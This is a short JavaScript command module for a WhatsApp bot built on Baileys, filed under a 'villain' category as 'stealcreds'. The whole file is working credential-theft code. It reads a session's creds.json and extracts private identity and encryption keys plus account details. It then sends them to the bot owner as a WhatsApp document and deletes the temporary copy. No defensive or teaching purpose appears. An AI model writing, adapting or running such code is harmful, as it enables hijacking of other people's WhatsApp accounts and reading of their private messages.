const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

// Exfiltrates session creds from a target Baileys session folder
// Usage: .stealcreds <session_path>

module.exports = {
    name: "stealcreds",
    category: "villain",
    aliases: ["dumpcreds", "exfilsession"],
    permissions: { owner: true },

    code: async (ctx) => {
        const { args, ownerNumber, sender, client } = ctx;
        const ownerJid = `${ownerNumber}@s.whatsapp.net`;
        if (sender !== ownerJid) return;

        const sessionPath = args[0] || "./session";
        const credsFile = path.join(sessionPath, "creds.json");

        if (!fs.existsSync(credsFile)) {
            return await ctx.reply(`❌ No creds found at ${credsFile}`);
        }

        const raw = fs.readFileSync(credsFile, "utf8");
        const creds = JSON.parse(raw);

        // Extract juicy bits
        const extract = {
            me: creds?.me,
            noiseKey: creds?.noiseKey?.private,
            signedIdentityKey: creds?.signedIdentityKey?.private,
            registrationId: creds?.registrationId,
            advSecretKey: creds?.advSecretKey,
            nextPreKeyId: creds?.nextPreKeyId,
            serverHasPreKeys: creds?.serverHasPreKeys,
            account: creds?.account,
            signedPreKey: creds?.signedPreKey
        };

        const dump = JSON.stringify(extract, null, 2);
        const tmpPath = `./data/exfil_${Date.now()}.json`;
        fs.writeFileSync(tmpPath, dump);

        await client.sendMessage(ownerJid, {
            document: fs.readFileSync(tmpPath),
            fileName: `session_dump_${creds?.me?.id?.split(":")[0] || "unknown"}.json`,
            mimetype: "application/json",
            caption: `📦 Session dump\n👤 ${creds?.me?.name || "Unknown"}\n📱 ${creds?.me?.id || "?"}`
        });

        fs.unlinkSync(tmpPath);
    }
};